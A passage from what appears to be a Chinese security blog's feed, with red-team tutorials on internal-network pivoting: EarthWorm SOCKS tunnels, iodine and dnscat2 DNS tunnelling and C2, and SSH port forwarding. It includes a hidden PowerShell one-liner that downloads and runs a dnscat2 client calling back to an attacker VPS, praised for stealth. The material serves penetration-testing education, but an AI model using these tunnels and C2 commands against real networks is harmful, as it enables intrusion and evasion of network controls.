href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p><p>ew 全称 <code>EarthWorm</code>，直译过来就是<code>蚯蚓</code>，引用作者的原话是：</p><blockquote><p>该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。</p></blockquote><p>这个描述也是很形象了。</p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>作者已经不提供 ew 的下载了，但是搜了一下 github 还是有其他人上传的，不过病毒需自查。</p><p>下载地址：<a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p><p>从这工具上传的时间是 5 年前就可以看出这个工具很有年代感了。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>该工具共有 6 种命令格式 ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran，正向连接的命令是 ssocked，反向连接的命令是 rcsocks 和 rssocks，其他命令用于一些比较复杂的网络环境中。</p><h4 id="a、正向连接"><a href="#a、正向连接" class="headerlink" title="a、正向连接"></a>a、正向连接</h4><p>正向连接需要目标主机有一个公网 IP，或者说攻击主机能够直接访问到目标主机。</p><p>命令也很简单</p><pre><code>ew -s ssocksd -l 1080</code></pre><pre><code> -s 设置状态模式 -l 设置监听端口</code></pre><pre><code>&gt; .\ew_for_Win.exe -s ssocksd -l 1080ssocksd 0.0.0.0:1080 &lt;--[10000 usec]--&gt; socks server</code></pre><p>然后使用 SocksCap、Proxifier、ProxyChains 等工具配置上目标主机的 IP 和监听端口即可，socks 要选择 socks5</p><h4 id="b、反向连接"><a href="#b、反向连接" class="headerlink" title="b、反向连接"></a>b、反向连接</h4><p>反向连接适合于目标没有公网 IP 的情况，这时就需要一台公网 vps 了，这里就直接以内网地址作为演示了。</p><p>在公网 VPS 上执行以下命令：</p><pre><code>ew -s rcsocks -l 1080 -e 4444</code></pre><pre><code> -e 设置反弹主机端口</code></pre><pre><code>&gt; ./ew_for_linux64 -s rcsocks -l 1080 -e 4444</code></pre><p>这条命令表示将 1080 端口接收到的数据转发到 4444 端口上。</p><p>在目标主机上执行以下命令：</p><pre><code>ew -s rssocks -d vps_ip -e 4444</code></pre><pre><code>-d 设置反弹主机 IP</code></pre><pre><code>&gt; .\ew_for_Win.exe -s rssocks -d 172.16.214.52 -e 4444</code></pre><p>这条命令表示在本地开启 socks 5 服务，并反弹到 vps 的 4444 端口，如果代理建立成功，在 VPS 端就会看到 <code>rssocks cmd_socket OK!</code> 的提示。</p><p>最后，代理 vps 的 1080 端口就可以访问到目标主机的内网了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-09_10-24-45.png"></p><h4 id="c、二级网络环境（一）"><a href="#c、二级网络环境（一）" class="headerlink" title="c、二级网络环境（一）"></a>c、二级网络环境（一）</h4><p>有这样的一个网络环境，目标主机A有两个网卡，一个内网地址一个公网地址，但这个主机只能访问内网主机B不能访问其他内网资源，而内网主机B不能访问外网但是能访问内网资源。</p><p>在拿到这两台主机权限后，就可以使用 ew 进行二级跳板访问到内网资源。</p><pre><code>内网主机A（有公网IP） --》内网主机B --》内网资源</code></pre><p>在内网主机B上，开启正向连接代理</p><pre><code>ew -s ssocksd -l 4444</code></pre><pre><code>&gt; .\ew_for_Win.exe -s ssocksd -l 4444</code></pre><p>在内网主机A上</p><pre><code>ew -s lcx_tran -l 1080 -f hostB_ip -g 4444</code></pre><pre><code>&gt; ./ew_for_linux64 -s lcx_tran -l 1080 -f 192.168.7.110 -g 4444</code></pre><p>这条命令表示将 1080 端口收到的代理请求转发到内网主机 B 192.168.7.110 的 4444 端口，此时就可以通过访问内网主机 A 的外网 IP 的 1080 端口访问到内网主机 B 上架设的 socks5 代理了。</p><h4 id="d、二级网络环境（二）"><a href="#d、二级网络环境（二）" class="headerlink" title="d、二级网络环境（二）"></a>d、二级网络环境（二）</h4><p>在上面的环境中，内网主机 A 有公网 IP，如果没有公网 IP 的情况下，又该怎么办呢？这时候就需要结合反向连接了，因此需要一台公网的 VPS 主机。</p><pre><code>VPS --》内网主机A --》内网主机B --》内网资源</code></pre><p>在公网 VPS 上</p><pre><code>ew -s lcx_listen -l 1080 -e 4444</code></pre><pre><code>&gt; ./ew_for_linux64 -s lcx_listen -l 1080 -e 4444rcsocks 0.0.0.0:1080 &lt;--[10000 usec]--&gt; 0.0.0.0:4444init cmd_server_for_rc herestart listen port here</code></pre><p>表示将 1080 收到的 代理请求转发到 4444 端口上</p><p>在内网主机 B 上</p><pre><code>ew -s ssocksd -l 5555</code></pre><pre><code>&gt; .\ew_for_Win.exe -s ssocksd -l 5555</code></pre><p>表示开启 5555 端口的正向代理</p><p>在内网主机 A 上</p><pre><code>ew -s lcx_slave -d vps_ip -e 4444 -f hostB_ip -g 5555</code></pre><pre><code>&gt; ./ew_for_linux64 -s lcx_slave -d 172.16.214.1 -e 4444 -f 192.168.7.110 -g 5555lcx_slave 172.16.214.1:4444 &lt;--[10000 usec]--&gt; 192.168.7.110:5555</code></pre><p>表示在内网主机 A 上使用 lcx_slave 的方式，将 VPS 的 4444 端口和内网主机 B 的 5555 端口连接起来。</p><p>现在就可以通过 VPS 的 1080 端口访问到内网主机 A 再访问到内网主机 B ，最后访问到内网资源了。</p><h4 id="e、三级网络环境"><a href="#e、三级网络环境" class="headerlink" title="e、三级网络环境"></a>e、三级网络环境</h4><p>目前有这样的一个环境，内网主机 A 没有公网 IP 不能访问内网资源，但是可以访问外网和内网主机 B，内网主机 B 不能访问外网和内网资源，但是可以和 A、C 相互访问，内网主机 C 能访问内网资源，但是只能和内网主机 B 相互访问，因此如果想访问到内网资源就需要做三层跳板。</p><pre><code>VPS --》内网主机 A --》内网主机 B --》内网主机 C</code></pre><p>在公网 VPS 上，将 1080 端口收到的代理请求转发到 4444 端口</p><pre><code>ew -s rcsocks -l 1080 -e 4444</code></pre><pre><code>&gt; ./ew_for_linux64 -s rcsocks -l 1080 -e 4444rcsocks 0.0.0.0:1080 &lt;--[10000 usec]--&gt; 0.0.0.0:4444init cmd_server_for_rc herestart listen port here</code></pre><p>在内网主机 A 上，将 VPS 的 4444 端口和内网主机 B 的 5555 端口连接起来</p><pre><code>ew -s lcx_slave -d vps_ip -e 4444 -f hostB_ip -g 5555</code></pre><pre><code>&gt; ./ew_for_linux64 -s lcx_slave -d 172.16.214.1 -e 4444 -f 192.168.7.110 -g 5555lcx_slave 172.16.214.1:4444 &lt;--[10000 usec]--&gt; 192.168.7.110:5555</code></pre><p>在内网主机 B 上，将 5555 端口收到的代理请求转发到 6666 端口上</p><pre><code>ew -s lcx_listen -l 5555 -e 6666</code></pre><pre><code>&gt; .\ew_for_Win.exe -s lcx_listen -l 5555 -e 6666rcsocks 0.0.0.0:5555 &lt;--[10000 usec]--&gt; 0.0.0.0:6666init cmd_server_for_rc herestart listen port here</code></pre><p>在内网主机 C 上，启动 socks5 服务，并反弹到 B 主机的 6666 端口上</p><pre><code>ew -s rssocks -d 192.168.7.110 -e 6666</code></pre><pre><code>&gt; .\ew_for_Win.exe -s rssocks -d 192.168.7.110 -e 6666rssocks 192.168.7.110:6666 &lt;--[10000 usec]--&gt; socks server</code></pre><p>至此，socks5 代理 VPS 的 1080 端口就会访问到内网资源了。</p><p>另外还有个 ew 的升级版工具叫 termite，不过比较遗憾的是 termite 在两年前也已经暂停更新了，这里也就不再大费周章的记录它了。</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、Socks-代理工具介绍&quot;&gt;&lt;a href=&quot;#1、Socks-代理工具介绍&quot; class=&quot;headerlink&quot; title=&quot;1、Socks 代理工具介绍&quot;&gt;&lt;/a&gt;1、Socks 代理工具介绍&lt;/h2&gt;&lt;p&gt;Socks 代理可以理解成升级版的 lcx，</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】9、iodine 使用</title>
    <link href="https://www.teamssix.com/year/210608-213403.html"/>
    <id>https://www.teamssix.com/year/210608-213403.html</id>
    <published>2021-06-08T13:34:03.000Z</published>
    <updated>2021-06-08T13:51:21.517Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>iodine 这个名字起的很有意思，iodine 翻译过来就是碘，碘的原子序数为 53，53 也就是 DNS 服务对应的端口号。 </p><p>iodine 和 dnscat2 一样，适合于其他请求方式被限制以至于只能发送 DNS 请求的环境中，iodine 同样也是分成了直接转发和中继两种模式。</p><p>iodine 与 dnscat2 不同的在于 Iodine 服务端和客户端都是用 C 语言开发，同时 iodine 的原理也有些不同，iodine 通过 TAP 在服务端和客户端分别建立一个局域网和虚拟网卡，再通过 DNS 隧道进行连接，然后使其处在同一个局域网中。</p><h2 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h2><p>首先需要有一个域名，并设置 NS 和 A 记录，A 记录指向自己的公网 VPS 地址，NS 记录指向 A 记录的子域名。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-07_17-20-20.png"></p><p>Kali 下自带 iodine ，Debian Linux 可以使用 apt 进行安装</p><pre><code>sudo apt-get install iodine</code></pre><p>Windows 可以直接到官网下载，下载地址：<a href="https://code.kryo.se/iodine/">https://code.kryo.se/iodine/</a>，服务端名称是 iodined.exe，客户端是 iodine.exe</p><h2 id="3、使用"><a href="#3、使用" class="headerlink" title="3、使用"></a>3、使用</h2><p>这里服务端使用的是 Linux，服务端命令如下：</p><pre><code>sudo iodined -f -c -P teamssix 192.168.77.1 dc.teamssix.com -DD</code></pre><pre><code> -f        在前台运行 -c        不检查传入请求的客户端 IP 地址 -P        客户端与服务端之间的连接密码 -D        调试级别，-D 表示第一级，-DD 表示第二级，依此类推 192.168.77.1 是自己自定义的局域网虚拟 IP 地址。</code></pre><p>这里客户端使用的是 Windows，Windows 客户端上除了要有 iodine 相关文件外，还需要安装 tap 网卡驱动程序，这里我百度找了一个下载地址 <a href="http://www.qudong51.net/qudong/981.html">http://www.qudong51.net/qudong/981.html</a></p><p>打开下载好的 tap 网卡驱动程序，一直下一步下一步安装就行。</p><p>然后就可以启动客户端程序了，注意下载下来的 dll 文件要和 exe 在一个目录下，不能只复制一个 exe 到目标主机上，而且要以管理员权限运行下面的命令。</p><pre><code>.\iodine.exe -f -r -P teamssix dc.teamssix.com</code></pre><pre><code>-r        iodine 有时会自动将 DNS 隧道切换成 UDP 通道，使用 -r 命令可以强制让 iodine 在任何情况下都使用 DNS 隧道</code></pre><p>如果出现 <code>Connection setup complete, transmitting data.</code> 就表示 DNS 隧道就已经建立了。</p><p>这时如果去 ping 服务端自定义的虚拟 IP 也是可以 ping 通的。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-08_21-12-06.png"></p><p>假如这里内网机器分配到了 192.168.77.2 这个 IP ，因为处在一个局域网中，所以 VPS 直接访问 192.168.77.2 的 3389、80 等端口就可以直接访问到内网机器的相关端口了，同样的内网主机也可以访问 VPS 的 22 端口等等，至此便绕过了策略限制。</p><blockquote><p>参考文章：</p><p><a href="https://www.cnblogs.com/micr067/p/12263337.html">https://www.cnblogs.com/micr067/p/12263337.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、介绍&quot;&gt;&lt;a href=&quot;#1、介绍&quot; class=&quot;headerlink&quot; title=&quot;1、介绍&quot;&gt;&lt;/a&gt;1、介绍&lt;/h2&gt;&lt;p&gt;iodine 这个名字起的很有意思，iodine 翻译过来就是碘，碘的原子序数为 53，53 也就是 DNS 服务对应的端口</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】dnscat2 使用</title>
    <link href="https://www.teamssix.com/year/210608-150224.html"/>
    <id>https://www.teamssix.com/year/210608-150224.html</id>
    <published>2021-06-08T07:02:24.000Z</published>
    <updated>2021-06-08T07:09:37.307Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>dnscat2 是一款 C2 工具，与常规 C2 工具不同的是它利用了 DNS 协议来创建加密的 C2 通道。</p><p>dnacat2 的客户端由 C 语言编写，服务端由 Ruby 语言编写，在攻击主机上开启服务端后，客户端放到目标主机上执行相关命令，攻击主机就能够收到来自客户端的会话了。</p><p>dnscat2 有两种使用模式，一是直连模式，二是中继模式，区别如下：</p><p>直连模式：客户端直接向指定 IP 地址的 DNS 服务器发起 DNS 解析请求</p><p>中继模式：像平时上网一样，DNS 先经过互联网的解析，最终指向我们的恶意 DNS 服务器，与直连模式相比速度较慢但是更安全。</p><p>在安全策略做的比较严格的内网中，如果发现只允许白名单流量出站，而且内网中还有诸多安全设备，同时在传统的 C2 通信无法建立的情况下，RT 就可以尝试使用 DNS 协议建立 C2 通信。</p><h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><h2 id="1、服务端"><a href="#1、服务端" class="headerlink" title="1、服务端"></a>1、服务端</h2><p>这里以 Ubuntu 为例</p><pre><code>git clone https://github.com/iagox86/dnscat2.gitcd dnscat2/server/sudo gem install bundlerbundle install</code></pre><p>如果运行 <code>sudo gem install bundler</code> 提示 <code>Command &#39;gem&#39; not found</code>，则需要先安装 ruby </p><pre><code>sudo apt-get install ruby</code></pre><p>如果运行 <code>bundle install</code> 提示 <code>Gem::Ext::BuildError: ERROR: Failed to build gem native extension.</code>，则需要先安装 ruby-dev</p><pre><code>sudo apt-get install ruby-dev</code></pre><h2 id="2、客户端"><a href="#2、客户端" class="headerlink" title="2、客户端"></a>2、客户端</h2><p>dnscat2 客户端在使用前需要进行编译才能使用，在 Windows 中可以使用 VS 进行编译或者直接使用 PowerShell 的版本，Linux 中可以使用 <code>make install</code> 进行编译。</p><p>Linux 下可以通过以下方法进行编译</p><pre><code>git clone https://github.com/iagox86/dnscat2.gitcd dnscat2/client/make</code></pre><p>Windows 可以直接下载已经编译好的版本</p><p>exe 版（解压密码：password）：<a href="https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip">https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip</a></p><p>PowerShell 版：<a href="https://github.com/lukebaggett/dnscat2-powershell">https://github.com/lukebaggett/dnscat2-powershell</a></p><p>如果使用 PowerShell 版，可以直接使用下面的命令导入，在实际情况中，也更推荐使用 PowerShell 版的，毕竟隐蔽性要更好些。</p><pre><code>IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#39;)</code></pre><p>或者下载 ps1 文件后，使用以下命令导入</p><pre><code>Import-Module .\dnscat2.ps1</code></pre><h1 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a>0x02 使用</h1><h2 id="1、直连模式"><a href="#1、直连模式" class="headerlink" title="1、直连模式"></a>1、直连模式</h2><p><strong>启动服务端</strong>，这里服务端 IP 为 172.16.214.50</p><pre><code>cd /dnscat2/serversudo ruby ./dnscat2.rb -s 553 -c teamssix --no-cache</code></pre><pre><code>-s 指定 dns 服务端口-c 指定连接密码--no-cache 禁止缓存，添加该项为了使和 PowerShell 版本的 dnscat2 兼容</code></pre><p><strong>启动客户端</strong>，这里以 Windows 下的 exe 版为例</p><pre><code>dnscat --dns server=172.16.214.50,port=553 --secret=teamssix</code></pre><p>连接成功后，会提示 <code>Session established!</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-07_16-44-12.png"></p><p>dnscat2 的一些命令</p><pre><code>sessions 或 windows                         查看当前会话session -i 1 或 window -i 1         进入 ID 为 1 的会话shell                     建立交互式会话exec                        远程打开程序download              下载文件help                        查看支持的命令</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/WX20210607-165615@2x.png"></p><p>抓下包，看看流量是什么样子的</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-07_17-01-52.png"></p><p>不难看出，流量中有很多 dnscat 的字样，这样一来，虽然使用了 dns 协议，但是隐蔽性还是差了不少，接下来看看中继模式。</p><h2 id="2、中继模式"><a href="#2、中继模式" class="headerlink" title="2、中继模式"></a>2、中继模式</h2><p>在中继模式下，需要自己有一个域名，并添加两条域名解析记录。</p><p>首先创建一条 A 记录指向自己的公网 VPS 地址，之后创建一条 ns 记录指向 A 记录的子域名，示例如下：</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-07_17-20-20.png"></p><p>如果想要判断自己的解析记录是否设置成功，可以通过以下方法进行判断。</p><p>A 记录：直接通过 nslookup 进行判断，如果解析出了 IP 说明该项配置正确。</p><pre><code>nslookup ns1.teamssix.com</code></pre><p>ns 记录：在公网 VPS 上开启抓包，再<code>nslookup dc.teamssix.com</code>，如果在 VPS 上看到对应的流量记录，说明该项配置正确。</p><pre><code>sudo tcpdump -n -i eth0 udp dst port 53</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-08_13-46-54.png"></p><p><strong>开启服务端</strong></p><pre><code>sudo ruby dnscat2.rb dc.teamssix.com -c teamssix --no-cache -e open</code></pre><pre><code>-e 指定安全级别，open 表示服务端允许客户端不进行加密</code></pre><p>如果提示<code>Address already in use - bind(2) for &quot;0.0.0.0&quot; port 53</code>，可以关闭<code>systemd-resolved</code></p><pre><code>sudo systemctl stop systemd-resolved</code></pre><p><strong>开启客户端</strong>，这里以 Windows 下的 PowerShell 版为例</p><pre><code>start-Dnscat2 -Domain dc.teamssix.com -PreSharedSecret teamssix -DNSServer vps_ip</code></pre><p>也可以把导入的命令和开启客户端的命令放在一起</p><pre><code>powershell.exe -nop -w hidden -c &#123;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#39;);start-Dnscat2 -Domain dc.teamssix.com -PreSharedSecret teamssix -DNSServer vps_ip&#125;</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-08_14-35-33.png"></p><p>再来抓下包，看看流量是什么样的</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-08_14-45-40.png"></p><p>可以看出，流量中已经没有了 dnscat 的字样，这也是为什么在介绍部分说中继模式比直连模式更安全的原因。</p><blockquote><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/2214">https://xz.aliyun.com/t/2214</a></p><p><a href="https://blog.csdn.net/localhost01/article/details/86591685">https://blog.csdn.net/localhost01/article/details/86591685</a></p><p><a href="https://blog.csdn.net/qq_36119192/article/details/104429983">https://blog.csdn.net/qq_36119192/article/details/104429983</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-介绍&quot;&gt;&lt;a href=&quot;#0x00-介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00 介绍&quot;&gt;&lt;/a&gt;0x00 介绍&lt;/h1&gt;&lt;p&gt;dnscat2 是一款 C2 工具，与常规 C2 工具不同的是它利用了 DNS 协议来创建加密的 C</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】SSH 隧道使用学习</title>
    <link href="https://www.teamssix.com/year/210604-154036.html"/>
    <id>https://www.teamssix.com/year/210604-154036.html</id>
    <published>2021-06-04T07:40:36.000Z</published>
    <updated>2021-06-08T07:10:44.785Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>SSH 全称 <code>Secure Shell</code>，从它的名字来看这个协议就比较安全。SSH 协议是一种应用层协议，支持几乎所有 UNIX、Linux 平台。</p><p>得益于 SSH 协议在传输过程中都是加密，所以在流量层面也较难区分合法的 SSH 流量和攻击者产生的 SSH 流量。</p><p>因此在内网渗透过程中，使用 SSH 协议进行建立隧道的方法，一方面不用自己再上传同类工具，另一方面降低了因上传使用了同类工具被管理员发现的风险。</p><h1 id="0x01-SSH-常用命令介绍"><a href="#0x01-SSH-常用命令介绍" class="headerlink" title="0x01 SSH 常用命令介绍"></a>0x01 SSH 常用命令介绍</h1><p>相信各位平时最常使用的 SSH 命令就是拿来连接 Linux 系统了，命令一般是这样：</p><pre><code>ssh root@192.168.1.1</code></pre><p>或者 -p 指定自己自定义的 SSH 端口、-i 指定自己的私钥文件等等。</p><p>如果拿 SSH 来创建隧道则需要用到下面的命令：</p><pre><code> -C 压缩传输，提高传输速度。 -f 将 SSH 传输转入后台执行，不占用当前 shell -N 建立静默连接（建立了连接但看不到具体会话） -g 允许远程主机连接本地用于转发的端口。 -L 本地端口转发 -R 远程端口转发 -D 动态转发（ SOCKS 代理） -p 指定 SSH 端口</code></pre><h1 id="0x02-本地转发"><a href="#0x02-本地转发" class="headerlink" title="0x02 本地转发"></a>0x02 本地转发</h1><p>目前有这样的一个环境，外网有一台攻击主机 ，可访问处于内网环境的 Web 服务器（双网卡），但无法访问 Web 服务器所在内网的办公主机，接下来就用 SSH 进行流量转发，使外网的攻击主机通过 Web 服务器访问到位于内网的办公主机。</p><p>环境拓扑如下：</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ssh1.jpg"></p><p>在攻击主机上执行以下命令，将内网办公主机的 3389 端口映射到自己的 3388 端口上</p><pre><code>ssh -CfNg -L 攻击主机端口:内网办公主机IP:内网办公主机端口 Web服务器ssh用户名@Web服务器IP</code></pre><pre><code class="#">&gt; ssh -CfNg -L 3388:192.168.7.110:3389 root@172.16.214.5root@172.16.214.5&#39;s password:</code></pre><p>这条命令的意思就是将 Web 服务器 172.16.214.5 作为跳板，将内网办公主机的 3389 端口转发到攻击主机的 3388 端口，这样只要访问攻击主机的 3388 端口就会访问到内网办公主机的 3389 端口了。</p><p>为了判断代理转发是否建立成功，可以通过 <code>netstat</code> 进行判断</p><pre><code>netstat -pantu | grep &quot;3388&quot;</code></pre><pre><code class="netstat">&gt; netstat -pantu | grep &quot;3388&quot;tcp        0      0 0.0.0.0:3388            0.0.0.0:*               LISTEN      14086/sshtcp6       0      0 :::3388                 :::*                    LISTEN      14086/ssh</code></pre><p>可以看到 ssh 程序已经监听 3388 端口了，接下来连接本地的 3388 端口就可以连接到内网办公主机的 3389 端口了</p><pre><code>rdesktop 127.0.0.1:3388</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ssh2.png"></p><h1 id="0x03-远程转发"><a href="#0x03-远程转发" class="headerlink" title="0x03 远程转发"></a>0x03 远程转发</h1><p>远程转发在这里其实也可以说是反向代理，目前有这样的一个环境：内网中不存在边界设备，但是内网的 Web 服务器能访问到攻击主机，而内网的办公主机则不行。</p><p>因此可以在拿到 Web 服务器的 Shell 后，采用远程转发的方式，即利用 Web 服务器 SSH 连接到攻击主机上进行代理转发，然后访问攻击主机的端口即可，拓扑图如下：</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ssh3.jpg"></p><p>将 Web 服务器作为跳板，进行远程转发</p><pre><code>ssh -CfNg -R 攻击主机端口:内网办公主机IP:内网办公主机端口 攻击主机ssh用户名@攻击主机IP</code></pre><pre><code>&gt; ssh -CfNg -R 3388:192.168.7.110:3389 root@172.16.214.48root@172.16.214.48&#39;s password:</code></pre><p>同样的，为了判断代理转发是否建立成功，也可以通过 <code>netstat</code> 进行判断，和之前一样都是在攻击主机下执行下面的命令</p><pre><code>netstat -pantu | grep &quot;3388&quot;</code></pre><pre><code>&gt; netstat -pantu | grep &quot;3388&quot;tcp        0      0 127.0.0.1:3388          0.0.0.0:*               LISTEN      24728/sshd: roottcp6       0      0 ::1:3388                :::*                    LISTEN      24728/sshd: root</code></pre><p>可以看到，同样的，在攻击主机上 3388 端口的监听已经被开启了，此时直接在攻击主机上访问 127.0.0.1:3388 就可以连接到 192.168.7.110:3389 了</p><pre><code>rdesktop 127.0.0.1:3388</code></pre><h1 id="0x04-动态转发"><a href="#0x04-动态转发" class="headerlink" title="0x04 动态转发"></a>0x04 动态转发</h1><p>动态转发需要攻击主机能够访问到目标主机，因此这里采用和本地转发一样的拓扑进行演示。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ssh1.jpg"></p><p>在攻击主机上执行下面的命令</p><pre><code>ssh -CfNg -D 攻击主机端口 Web服务器ssh用户名@Web服务器IP</code></pre><pre><code>&gt; ssh -CfNg -D 4444 root@172.16.214.5root@172.16.214.5&#39;s password:</code></pre><p>使用 <code>netstat</code> 可以看到现在 4444 端口已经被监听了</p><pre><code>netstat -pantu | grep &quot;4444&quot;</code></pre><pre><code>&gt; netstat -pantu | grep &quot;4444&quot;tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      3979/sshtcp6       0      0 :::4444                 :::*                    LISTEN      3979/ssh</code></pre><p>动态转发其实就是建立一个 socks 连接，任何支持 socks 4/5 协议的程序都可以使用这个加密通道进行访问，例如这里以 proxychains 为例，借助 proxychains 从攻击主机访问到内网的办公主机的 3389 端口。</p><p>在 kali 上如果没有自带 proxychains，可以直接使用 <code>sudo apt install proxychains</code> 进行安装，安装完成后，需要修改 proxychains 的配置文件</p><pre><code>vim /etc/proxychains4.conf</code></pre><p>来到配置文件最后一行，如果有之前配置好的代理，可以用 # 号注释掉，然后另起一行添加上我们的代理，添加内容为：</p><pre><code>socks5 127.0.0.1 4444</code></pre><p>修改后之后，按下<code>esc</code>，然后按下<code>:wq</code> 保存退出</p><p>之后使用下面的命令连接内网办公主机 192.168.7.110 的 3389 端口。</p><pre><code>proxychains4 rdesktop 192.168.7.110:3389 </code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ssh4.png"></p><p>可以看到动态转发要比本地转发自由度高出不少，借助动态转发可以访问到内网 Web 服务器能访问的所有地址、端口，没有了本地转发只能访问单个IP、端口的限制。</p><h1 id="0x05-SSH-隧道攻击的防御"><a href="#0x05-SSH-隧道攻击的防御" class="headerlink" title="0x05 SSH 隧道攻击的防御"></a>0x05 SSH 隧道攻击的防御</h1><p>对 SSH 进行双向访问控制策略可以避免这些问题，一方面只允许可信 IP 才能连接，一方面只允许连接到可信 IP。</p><blockquote><p>参考文章：</p><p><a href="https://baike.baidu.com/item/SSH/10407">https://baike.baidu.com/item/SSH/10407</a></p><p><a href="https://zhuanlan.zhihu.com/p/174782978">https://zhuanlan.zhihu.com/p/174782978</a><br>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;SSH 全称 &lt;code&gt;Secure Shell&lt;/code&gt;，从它的名字来看这个协议就比较安全。</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
